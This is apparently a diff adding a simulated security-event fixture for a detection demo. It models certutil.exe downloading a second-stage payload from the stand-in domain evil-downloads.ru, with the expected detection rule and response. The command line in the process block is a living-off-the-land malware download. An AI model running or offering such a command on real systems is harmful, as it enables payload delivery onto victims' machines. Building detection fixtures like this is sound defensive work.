@@ -1,0 +1,44 @@
+{
+  "scenario_id": "SCENARIO_05_MALICIOUS_DOWNLOAD",
+  "title": "Ingress Tool Transfer via Living-off-the-Land Binary (Certutil)",
+  "description": "Adversary uses legitimate system utility certutil.exe to download a second-stage payload from an external domain.",
+  "is_simulation": true,
+  "mitre_technique": "T1105",
+  "target_device": "DEV-DEMO-WORKSTATION-01",
+  "events": [
+    {
+      "event_id": "sim-dl-0001",
+      "timestamp": "2026-09-16T09:20:00.000Z",
+      "device_id": "DEV-DEMO-WORKSTATION-01",
+      "event_type": "PROCESS_EXECUTION",
+      "severity": "HIGH",
+      "source": "cyber-sentinel-demo-simulator",
+      "isSimulation": true,
+      "user": { "name": "victim_user", "domain": "CORP" },
+      "process": {
+        "name": "certutil.exe",
+        "pid": 8192,
+        "ppid": 5824,
+        "path": "C:\\Windows\\System32\\certutil.exe",
+        "command_line": "certutil.exe -urlcache -split -f http://evil-downloads.ru/stage2.bin C:\\Users\\victim_user\\AppData\\Local\\Temp\\stage2.bin",
+        "hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+      },
+      "network": {
+        "source_ip": "192.168.1.105",
+        "dest_ip": "91.240.118.172",
+        "dest_port": 80,
+        "protocol": "TCP",
+        "direction": "OUTBOUND",
+        "domain": "evil-downloads.ru"
+      },
+      "details": {
+        "lolbin": "certutil.exe",
+        "targetUrl": "http://evil-downloads.ru/stage2.bin",
+        "destinationPath": "C:\\Users\\victim_user\\AppData\\Local\\Temp\\stage2.bin"
+      }
+    }
+  ],
+  "expected_detection_rule": "RULE_INGRESS_TRANSFER_012",
+  "expected_mitre_technique": "T1105 - Ingress Tool Transfer",
+  "recommended_response": "BLOCK_IP (91.240.118.172) & QUARANTINE_FILE"
+}
